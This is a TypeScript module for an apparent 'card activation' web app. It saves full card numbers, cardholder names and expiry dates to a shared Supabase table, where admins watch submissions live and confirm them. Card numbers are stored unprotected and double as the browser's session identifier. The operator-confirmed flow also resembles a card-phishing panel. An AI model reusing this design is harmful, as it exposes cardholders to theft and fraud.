// Shared activations service — backed by Lovable Cloud so admins on any device
// see every request and confirmations propagate to users in real time.
import { supabase } from "@/integrations/supabase/client";

export type ActivationStatus = "processing" | "activated";

export interface Activation {
  id: string;
  card_number: string;
  cardholder: string;
  expiry: string;
  status: ActivationStatus;
  submitted_at: string;
  updated_at: string;
}

export function normalizeCardNumber(cardNumber: string) {
  return cardNumber.replace(/\s+/g, "");
}

export async function createOrUpdateActivation(input: {
  cardNumber: string;
  cardholder: string;
  expiry: string;
}): Promise<Activation> {
  const card_number = normalizeCardNumber(input.cardNumber);
  const { data, error } = await supabase
    .from("activations")
    .upsert(
      {
        card_number,
        cardholder: input.cardholder,
        expiry: input.expiry,
        status: "processing",
        submitted_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
      },
      { onConflict: "card_number" },
    )
    .select()
    .single();
  if (error) throw error;
  return data as Activation;
}

export async function getActivationByCard(
  cardNumber: string,
): Promise<Activation | null> {
  const card_number = normalizeCardNumber(cardNumber);
  const { data, error } = await supabase
    .from("activations")
    .select("*")
    .eq("card_number", card_number)
    .maybeSingle();
  if (error) throw error;
  return (data as Activation) ?? null;
}

export async function listActivations(): Promise<Activation[]> {
  const { data, error } = await supabase
    .from("activations")
    .select("*")
    .order("submitted_at", { ascending: false });
  if (error) throw error;
  return (data ?? []) as Activation[];
}

export async function confirmActivation(id: string): Promise<void> {
  const { error } = await supabase
    .from("activations")
    .update({ status: "activated", updated_at: new Date().toISOString() })
    .eq("id", id);
  if (error) throw error;
}

export async function deleteActivation(id: string): Promise<void> {
  const { error } = await supabase.from("activations").delete().eq("id", id);
  if (error) throw error;
}

export function subscribeToActivations(cb: () => void) {
  const channel = supabase
    .channel("activations-changes")
    .on(
      "postgres_changes",
      { event: "*", schema: "public", table: "activations" },
      () => cb(),
    )
    .subscribe();
  return () => {
    supabase.removeChannel(channel);
  };
}

// --- Local session (which card the current browser is signed into) ---
const SESSION_KEY = "card-session-number";
const EVENT = "card-session-change";

export function getSessionCardNumber(): string | null {
  if (typeof window === "undefined") return null;
  return localStorage.getItem(SESSION_KEY);
}

export function setSessionCardNumber(cardNumber: string) {
  if (typeof window === "undefined") return;
  localStorage.setItem(SESSION_KEY, normalizeCardNumber(cardNumber));
  window.dispatchEvent(new CustomEvent(EVENT));
}

export function clearSession() {
  if (typeof window === "undefined") return;
  localStorage.removeItem(SESSION_KEY);
  window.dispatchEvent(new CustomEvent(EVENT));
}

export function subscribeSession(cb: () => void) {
  if (typeof window === "undefined") return () => {};
  const handler = () => cb();
  window.addEventListener(EVENT, handler);
  window.addEventListener("storage", handler);
  return () => {
    window.removeEventListener(EVENT, handler);
    window.removeEventListener("storage", handler);
  };
}
